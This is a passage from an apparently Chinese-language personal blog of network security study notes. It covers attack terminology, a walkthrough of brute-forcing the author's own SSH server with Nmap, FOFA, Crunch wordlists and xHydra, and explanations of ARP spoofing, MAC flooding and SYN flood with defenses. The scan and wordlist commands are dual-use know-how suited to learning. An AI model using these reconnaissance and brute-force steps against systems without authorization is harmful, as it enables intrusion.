@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/WenGuiO.github.io/tree/1.18.5">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://gcore.jsdelivr.net'>
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+  <meta name="msvalidate.01" content="45968838DFB6C9D5B590645B5E53E4F5" />
+
+  <meta name="360-site-verification" content="fd51027118ddbf66f8025e6cc73e816c" />
+  <meta name="baidu-site-verification" content="codeva-l18amtgLO6" />
+  <meta name="sogou_site_verification" content="PW4jAJ0fbl" />
+  <meta name="bytedance-verification-code" content="hyqYqjYQ1Udxu1V3G4bO" />
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+
+  <title>网络安全简单记录 - 闻桂の小窝</title>
+
+  
+    <meta name="description" content="网络安全攻防基础1.入侵原理服务器向外提供很多服务（Web，Mail，Mysql，SSH等等），开启服务必有开放端口来提供服务，入侵者通过可通过各种工具（fofa，whois，namp，xhydra等等）来获取服务器IP，服务器应用，应用版本等等信息，并寻找漏洞进行爆破入侵。 2.部分术语记录与回顾   POC：概念验证。验证安全漏洞是否存在，是否可利用。   EXP：漏洞利用。利用漏洞入侵攻击。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全简单记录">
+<meta property="og:url" content="https://wengui.work/2023/03/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="闻桂の小窝">
+<meta property="og:description" content="网络安全攻防基础1.入侵原理服务器向外提供很多服务（Web，Mail，Mysql，SSH等等），开启服务必有开放端口来提供服务，入侵者通过可通过各种工具（fofa，whois，namp，xhydra等等）来获取服务器IP，服务器应用，应用版本等等信息，并寻找漏洞进行爆破入侵。 2.部分术语记录与回顾   POC：概念验证。验证安全漏洞是否存在，是否可利用。   EXP：漏洞利用。利用漏洞入侵攻击。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-12T13:46:02.000Z">
+<meta property="article:modified_time" content="2023-03-12T13:47:13.987Z">
+<meta property="article:author" content="wengui">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+  
+  
+
+  </script>
+  
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="/assets/img/favicon.png">
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/assets/img/avatar1.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">闻桂の小窝</div><div class="sub normal cap">事常足，心常惬</div><div class="sub hover cap" style="opacity:0"> wengui</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/wiki/">智库</a><a class="nav-item" href="/notes/">宝盒</a><a class="nav-item" href="/about/">更多</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">抱歉，没有找到内容欧~~换个关键词试试！</div></div></div></widget>
+
+<widget class="widget-wrapper markdown"><div class="widget-header cap theme dis-select"><span class="name">寄语</span></div><div class="widget-body fs14"><p>保持期待，奔赴山海</p>
+</div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">网络安全简单记录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80"><span class="toc-text">网络安全攻防基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%A5%E4%BE%B5%E5%8E%9F%E7%90%86"><span class="toc-text">1.入侵原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%83%A8%E5%88%86%E6%9C%AF%E8%AF%AD%E8%AE%B0%E5%BD%95%E4%B8%8E%E5%9B%9E%E9%A1%BE"><span class="toc-text">2.部分术语记录与回顾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7"><span class="toc-text">3.安全工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E7%9A%84%E8%AE%B0%E5%BD%95"><span class="toc-text">4. 简单使用工具实战的记录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8"><span class="toc-text">网络协议安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ARP%E5%8D%8F%E8%AE%AE"><span class="toc-text">1.ARP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-ARP%E6%AC%BA%E9%AA%97"><span class="toc-text">1.1 ARP欺骗</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%AC%BA%E9%AA%97"><span class="toc-text">主机欺骗</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E5%85%B3%E6%AC%BA%E9%AA%97"><span class="toc-text">网关欺骗</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%BD%AC%E5%8F%91"><span class="toc-text">1.2 交换机转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-MAC%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB"><span class="toc-text">1.3 MAC泛洪攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-TCP%E5%8D%8F%E8%AE%AE"><span class="toc-text">2.TCP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B"><span class="toc-text">2.1 三次握手</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-SYN-Flood%E6%94%BB%E5%87%BB"><span class="toc-text">2.2 SYN Flood攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-DHCP%E5%8D%8F%E8%AE%AE"><span class="toc-text">3.DHCP协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8"><span class="toc-text">操作系统安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Metasploit"><span class="toc-text">1.Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Windous%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.Windous漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-MS08-067"><span class="toc-text">2.1 MS08-067</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-MS17-010%EF%BC%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89"><span class="toc-text">2.2 MS17-010（永恒之蓝）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-CVE-2019-0708%EF%BC%88BlueKeep%EF%BC%89"><span class="toc-text">2.3 CVE-2019-0708（BlueKeep）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Linux%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.Linux漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-CVE-2017-7494"><span class="toc-text">3.1 CVE-2017-7494</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-CVE-2016-5196%EF%BC%88%E8%84%8F%E7%89%9BDirty-COW%EF%BC%89"><span class="toc-text">3.2 CVE-2016-5196（脏牛Dirty COW）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8"><span class="toc-text">Web应用安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8"><span class="toc-text">数据库安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-text">1. 数据库弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E9%9A%90%E6%82%A3"><span class="toc-text">2. 数据库配置隐患</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-text">3. 未授权漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E"><span class="toc-text">4. 数据库产品漏洞</span></a></li></ol></li></ol></div></div></widget>
+
+
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></div><div id="post-meta">发布于&nbsp;<time datetime="2023-03-12T13:46:02.000Z">2023-03-12</time></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>网络安全简单记录</span></h1>
+<h2 id="网络安全攻防基础"><a href="#网络安全攻防基础" class="headerlink" title="网络安全攻防基础"></a>网络安全攻防基础</h2><h3 id="1-入侵原理"><a href="#1-入侵原理" class="headerlink" title="1.入侵原理"></a>1.入侵原理</h3><p>服务器向外提供很多服务（Web，Mail，Mysql，SSH等等），开启服务必有开放端口来提供服务，入侵者通过可通过各种工具（fofa，whois，namp，xhydra等等）来获取服务器IP，服务器应用，应用版本等等信息，并寻找漏洞进行爆破入侵。</p>
+<h3 id="2-部分术语记录与回顾"><a href="#2-部分术语记录与回顾" class="headerlink" title="2.部分术语记录与回顾"></a>2.部分术语记录与回顾</h3><blockquote>
+<p>  <strong>POC</strong>：概念验证。验证安全漏洞是否存在，是否可利用。</p>
+<p>  <strong>EXP</strong>：漏洞利用。利用漏洞入侵攻击。</p>
+<p>  <strong>Payload</strong>：攻击载荷。拿下目标机器后，在机器上执行攻击&#x2F;后门代码。</p>
+<p>  <strong>Shell</strong>：连接用户与Linux内核的应用程序。</p>
+<p>  <strong>webshell</strong>：以asp，php，jsp等网页文件存在的代码执行环境。</p>
+<p>  <strong>内网</strong>：企业内网或局域网，用于内部办公，部署业务等，外网不可访问。</p>
+<p>  <strong>DMZ</strong>：隔离区，对外服务区，如网站，论坛等，外网可直接访问。</p>
+<p>  <strong>代理（Proxy）</strong>：通过第三方（服务器、工具）进行访问，常用于身份隐藏，端口转发。</p>
+<p>  <strong>拖库攻击</strong>：入侵者将数据库拖出到自身本地服务器的过程。</p>
+<p>  <strong>洗库攻击</strong>：入侵者试图从目标数据库中删除或篡改数据的行为。</p>
+<p>  <strong>撞库攻击</strong>：入侵者使用从其他泄漏数据中获取的用户名和密码组合来尝试访问目标网站或应用程序的行为。</p>
+<p>  <strong>DOS攻击</strong>：通过消耗目标计算机系统的资源，使其无法正常对外提供服务。通常是通过向计算机发送大量的无效请求或恶意数据包，导致服务被拒绝或系统崩溃。</p>
+</blockquote>
+<h3 id="3-安全工具"><a href="#3-安全工具" class="headerlink" title="3.安全工具"></a>3.安全工具</h3><p><strong>信息收集</strong>：爱企查，搜索引擎，Shodan，Nmap，FOFA …</p>
+<p><strong>漏洞扫描</strong>：AWVS，Nessus，Burp Suite …</p>
+<p><strong>渗透攻击</strong>：Hydra，Metasploit …</p>
+<p><strong>后渗透攻击</strong>：Metasploit …</p>
+<h3 id="4-简单使用工具实战的记录"><a href="#4-简单使用工具实战的记录" class="headerlink" title="4. 简单使用工具实战的记录"></a>4. 简单使用工具实战的记录</h3><p><strong>目标：</strong>爆破自己的 ssh 服务器</p>
+<p><strong>工具：</strong>FOFA，Namp，Crunch，xHydra</p>
+<p><strong>步骤：</strong></p>
+<ul>
+<li>根据域名，使用FOFA（或其他在线工具）收集信息:  IP，服务器，端口，应用版本等等，收集到IP。</li>
+<li>根据IP，使用Nmap扫描，扫描到端口的服务信息：22  SSH。</li>
+<li>结合自身信息，使用Crunch生成用户，密码字典保存至文件。</li>
+<li>使用Hydra图形化工具xHydra进行爆破。</li>
+</ul>
+<p><strong>工具简单使用说明：</strong></p>
+<ul>
+<li><p>Nmap：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ip扫描</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">ip</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网段扫描</span></span><br><span class="line"><span class="string">nmap</span> <span class="number">192.168</span><span class="number">.31</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数扫描</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-sS</span> <span class="string">-sV</span> <span class="string">-T4</span>  <span class="number">192.168</span><span class="number">.31</span><span class="number">.228</span></span><br><span class="line"><span class="comment"># -sS 使用 TCP SYN 扫描</span></span><br><span class="line"><span class="comment"># -sV 进行版本探测</span></span><br><span class="line"><span class="comment"># -T4 快速扫描方式 ，扫描速度在T0-T5之间，级别越高越快</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-A</span> <span class="string">-T4</span>  <span class="number">192.168</span><span class="number">.31</span><span class="number">.228</span></span><br><span class="line"><span class="comment"># -A 采用全面扫描</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>FOFA：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">搜索语法，可用</span> <span class="string">&amp;</span> <span class="string">组合</span></span><br><span class="line">   <span class="string">IP：ip</span> <span class="string">=</span> <span class="string">&quot;1.1.1.10&quot;</span></span><br><span class="line">   <span class="string">端口：port</span> <span class="string">=</span> <span class="string">&quot;8080&quot;</span></span><br><span class="line">   <span class="string">域名：domin</span> <span class="string">=</span> <span class="string">&quot;www.a.com&quot;</span></span><br><span class="line">   <span class="string">城市：city</span> <span class="string">=</span> <span class="string">&quot;Hangzhou&quot;</span></span><br><span class="line">   <span class="string">App：app</span> <span class="string">=</span> <span class="string">&quot;phpMyAdmin&quot;</span></span><br><span class="line">   <span class="string">服务器：server</span> <span class="string">=</span> <span class="string">&quot;Micrisoft-lls/7.5&quot;</span></span><br><span class="line">   <span class="string">and</span> <span class="string">so</span> <span class="string">on</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Crunch：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">min:</span> <span class="string">最小字符串长度</span></span><br><span class="line"><span class="attr">max:</span> <span class="string">最大字符串长度</span></span><br><span class="line"><span class="string">-o:</span> <span class="string">将生成字典保存在指定文件</span></span><br><span class="line"><span class="string">-t:</span> <span class="string">指定密码输出格式,配合特殊字符参数</span></span><br><span class="line"><span class="string">-p:</span> <span class="string">指定元素组合</span></span><br><span class="line"></span><br><span class="line"><span class="string">特殊字符：</span></span><br><span class="line">	<span class="string">%</span> <span class="string">数字</span></span><br><span class="line">	<span class="string">ˆ</span> <span class="string">特殊字符</span></span><br><span class="line">	<span class="string">@</span> <span class="string">小写字母</span></span><br><span class="line">	<span class="string">，</span> <span class="string">大写字母</span></span><br></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成 2-4 位字符串保存至 1.txt</span></span><br><span class="line"><span class="string">crunch</span> <span class="number">2</span> <span class="number">4</span> <span class="string">&gt;</span> <span class="number">1.</span><span class="string">txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成 7 位 以 admin 开头 后两位为 数字 的字典字符串（-t）,保存至2.txt</span></span><br><span class="line"><span class="string">crunch</span> <span class="number">7</span> <span class="number">7</span> <span class="string">-t</span> <span class="string">admin%%</span> <span class="string">&gt;</span> <span class="number">2.</span><span class="string">txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装 库文件 的 hex-lower 模板 生成6位字典 存至3.txt</span></span><br><span class="line"><span class="comment">#使用 cat /usr/share/crunch/charset.list 可查看模板</span></span><br><span class="line"><span class="string">crunch</span> <span class="number">6</span> <span class="number">6</span> <span class="string">-f</span> <span class="string">/usr/share/crunch/charset.list</span> <span class="string">hex-lower</span> <span class="string">-o</span> <span class="number">3.</span><span class="string">txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成指定字符(1 - 9)的字典</span></span><br><span class="line"><span class="string">crunch</span> <span class="number">6</span> <span class="number">6</span> <span class="number">0123456789</span> <span class="string">-o</span> <span class="number">4.</span><span class="string">txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定字符串(abc, 123, wen)组合的字典</span></span><br><span class="line"><span class="string">crunch</span> <span class="number">6</span> <span class="number">6</span> <span class="string">-p</span> <span class="string">abc</span> <span class="number">123</span> <span class="string">wen</span> <span class="string">-o</span> <span class="number">6.</span><span class="string">txt</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>xHydra：协议爆破，  hydra的图形操作工具</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.</span>  <span class="string">target</span> </span><br><span class="line">    <span class="string">ip（列表txt），Port端口，Protocol协议</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="string">.</span>  <span class="string">Password</span></span><br><span class="line">    <span class="string">user（列表txt），password（列表txt、密码本）</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="string">.</span>  <span class="string">其他</span></span><br><span class="line">    <span class="string">进程，速率，保存</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span><span class="string">.</span>  <span class="string">输出</span></span><br><span class="line">    <span class="string">结果列表加粗即为密码</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="网络协议安全"><a href="#网络协议安全" class="headerlink" title="网络协议安全"></a>网络协议安全</h2><h3 id="1-ARP协议"><a href="#1-ARP协议" class="headerlink" title="1.ARP协议"></a>1.ARP协议</h3><p><strong>概述</strong>：Address Resolution Protocol，地址解析协议，询问目标IP对应的MAC地址，用于在局域网（LAN）上实现主机之间的通信。</p>
+<p><strong>工作原理：</strong></p>
+<ul>
+<li>当<strong>主机A</strong>要向<strong>主机B</strong>发送数据时，首先会检查自己的ARP缓存中是否已经有主机B的MAC地址。如果有，就直接将数据发送到主机B的MAC地址；如果没有，就进行以下步骤。</li>
+<li><strong>主机A</strong>向<strong>局域网中</strong>所有主机发送一个ARP请求，询问目标IP地址对应的MAC地址。请求中包含了源IP地址和MAC地址，以及目标IP地址，并使用广播方式发送，局域网上的<strong>所有主机</strong>都会收到该报文。</li>
+<li>当<strong>主机B</strong>收到ARP请求报文后，会检查该报文中的目标IP地址是否与自己的IP地址匹配。如果匹配，就将自己的MAC地址作为ARP响应返回给<strong>主机A</strong>；如果不匹配，则忽略。</li>
+<li><strong>主机A</strong>收到ARP响应后，会将<strong>主机B</strong>的IP地址和MAC地址存储到自己的ARP缓存中，并使用该MAC地址发送数据包到<strong>主机B</strong>。</li>
+</ul>
+<h4 id="1-1-ARP欺骗"><a href="#1-1-ARP欺骗" class="headerlink" title="1.1 ARP欺骗"></a>1.1 ARP欺骗</h4><p><strong>原理：</strong></p>
+<ul>
+<li>ARP缓存的缺陷：主机不会验证自己是否给对方发过ARP请求，有新的对应关系就替换掉旧的对应关系。</li>
+<li>攻击者发送虚假的ARP响应给目标主机，欺骗目标主机将攻击者的MAC地址存储到ARP缓存表中，从而导致目标主机发送数据包时将数据包发送到攻击者的主机。</li>
+</ul>
+<p><strong>例子：</strong></p>
+<ul>
+<li>一个局域网，有三台主机A、B、C。主机A想要与主机C通信，但它不知道主机C的MAC地址。于是主机A向整个局域网发送ARP请求，请求对应IP地址的MAC地址。主机C收到ARP请求后，向主机A发送ARP响应，包含自己的MAC地址。</li>
+<li>攻击者在这个局域网中也存在，攻击者发送一个虚假的ARP响应，将自己的MAC地址伪装成主机C的MAC地址，并将ARP响应发送给主机A。由于ARP协议不提供任何安全措施，主机A会将攻击者的MAC地址存储到ARP缓存表中（原存储的主机C的MAC地址被替换），从而导致主机A将通信数据包发送到攻击者的计算机上。</li>
+</ul>
+<h5 id="主机欺骗"><a href="#主机欺骗" class="headerlink" title="主机欺骗"></a>主机欺骗</h5><p>主机A和主机B都需要与服务器通信。攻击者控制着另外一台计算机，想要窃取主机A和主机B发送给服务器的数据。攻击者可以进行ARP主机欺骗攻击：</p>
+<ul>
+<li>攻击者发送一个虚假的ARP响应报文给主机A，欺骗主机A认为攻击者的MAC地址是服务器的MAC地址。</li>
+<li>主机A收到虚假的ARP响应报文后，将攻击者的MAC地址存储在ARP缓存表中，并发送数据包给攻击者的计算机，而不是真正的服务器。</li>
+<li>攻击者截获主机A发送的数据包，并篡改数据，然后再将修改后的数据包发送给服务器，从而窃取数据。</li>
+</ul>
+<blockquote>
+<p>  <strong>防护:</strong>   使用静态ARP表（但更改较麻烦）</p>
+</blockquote>
+<h5 id="网关欺骗"><a href="#网关欺骗" class="headerlink" title="网关欺骗"></a>网关欺骗</h5><p>攻击者会发送虚假的ARP响应，欺骗网络中其他设备，使它们将攻击者的MAC地址误认为是网关的MAC地址，从而导致网络流量经过攻击者的计算机，攻击者可以对流量进行窃听、篡改。</p>
+<ul>
+<li>攻击者发送一个虚假的ARP响应报文给局域网中的所有计算机，欺骗它们认为攻击者的计算机的MAC地址是网关设备的MAC地址。</li>
+<li>其他计算机接收到虚假的ARP响应报文后，将攻击者的计算机作为网关设备，并将所有的数据包发送到攻击者的计算机上。</li>
+<li>攻击者的计算机截取所有发送到网关的数据包，可篡改其中的数据或者进行其他的攻击。</li>
+</ul>
+<blockquote>
+<p>  <strong>防护：</strong> 在网关绑定主机 MAC 与 IP</p>
+</blockquote>
+<h4 id="1-2-交换机转发"><a href="#1-2-交换机转发" class="headerlink" title="1.2 交换机转发"></a>1.2 交换机转发</h4><p>交换机用于连接多台计算机、服务器和其他网络设备，在局域网中实现数据包的转发、筛选和分发。</p>
+<p>交换机转发数据包：</p>
+<ul>
+<li>接收数据包：交换机会接收到来自计算机或其他设备的数据包。</li>
+<li>判断MAC地址：交换机检查数据包中的目标MAC地址，并查找自己的MAC地址表（也叫转发表或CAM表）以确定下一步转发的端口。</li>
+<li>转发数据包：交换机会将数据包转发到目标MAC地址所对应的端口。如果目标MAC地址不在地址表中，就会将数据包转发到所有端口（广播）。</li>
+<li>更新MAC地址表：将数据包源MAC地址和端口信息添加到MAC地址表，以便下一次转发更快地确定目标端口。</li>
+<li>筛选数据包：交换机可以根据各种条件（IP地址、协议类型等）对数据包进行筛选和分发。</li>
+</ul>
+<h4 id="1-3-MAC泛洪攻击"><a href="#1-3-MAC泛洪攻击" class="headerlink" title="1.3 MAC泛洪攻击"></a>1.3 MAC泛洪攻击</h4><p>向交换机发送大量的虚假MAC地址，从而使交换机的MAC地址表溢出，导致交换机将数据包广播到所有端口上，从而使攻击者能够窃听其他设备之间的通信内容。</p>
+<blockquote>
+<p>  <strong>防护：</strong></p>
+<ul>
+<li>使用交换机上的端口安全功能，限制单个端口上允许连接的MAC地址数量。</li>
+<li>使用交换机上的MAC地址静态绑定功能，限制MAC地址与端口的绑定关系。</li>
+<li>限制交换机上允许进入的最大MAC地址数量。</li>
+</ul>
+</blockquote>
+<h3 id="2-TCP协议"><a href="#2-TCP协议" class="headerlink" title="2.TCP协议"></a>2.TCP协议</h3><p>概述：Transmission Control Protocol，传输控制协议，提供可靠的数据传输服务。</p>
+<h4 id="2-1-三次握手"><a href="#2-1-三次握手" class="headerlink" title="2.1 三次握手"></a>2.1 三次握手</h4><p>传输前需通过三次握手建立连接（以下只是概述）：</p>
+<ul>
+<li>第一次握手：主机A向主机B发送一个带有SYN标志的数据包，表示请求建立连接。</li>
+<li>第二次握手：主机B收到主机A发送的SYN数据包后，回应一个带有SYN和ACK标志的数据包给主机A，表示确认请求建立连接，并且请求建立连接的另一方也可以进行确认。</li>
+<li>第三次握手：主机A收到主机B发送的ACK数据包后，再次回应一个带有ACK标志的数据包给主机B，表示连接已经建立成功。</li>
+</ul>
+<h4 id="2-2-SYN-Flood攻击"><a href="#2-2-SYN-Flood攻击" class="headerlink" title="2.2 SYN Flood攻击"></a>2.2 SYN Flood攻击</h4><p>一种典型的DDOS攻击。</p>
+<p><strong>原理：</strong>利用TCP协议中的三次握手过程，攻击者发送大量的伪造的SYN数据包给目标主机，并且在回应ACK数据包之前关闭连接。使目标主机在等待ACK数据包的同时会消耗大量的资源，从而使得正常的TCP连接请求无法被处理。SYN数据包数量超过目标主机处理能力时，目标主机就会被迫停止服务，从而导致服务不可用。</p>
+<blockquote>
+<p>  <strong>防护：</strong> </p>
+<ul>
+<li>监视并释放无效链接，不停监视系统的半开来连接与不活动连接，达到一定阈值时拆除链接。</li>
+<li>延缓  TCB 分配方法：Syn Cache技术， Syn Cookie技术</li>
+<li>SYN Proxy防火墙：对 SYN 请求进行验证</li>
+<li>TCP Safe Reset技术</li>
+</ul>
+</blockquote>
+<h3 id="3-DHCP协议"><a href="#3-DHCP协议" class="headerlink" title="3.DHCP协议"></a>3.DHCP协议</h3><p><strong>概述：</strong>为计算机网络中的设备分配IP地址和其他网络配置信息的动态主机配置协议。</p>
+<p><strong>工作原理：</strong></p>
+<ul>
+<li>发现（Discover）：当设备连接到网络时，它会发送一个DHCP发现消息，请求分配一个IP地址和其他网络配置信息。这个消息被广播到网络上的所有DHCP服务器。</li>
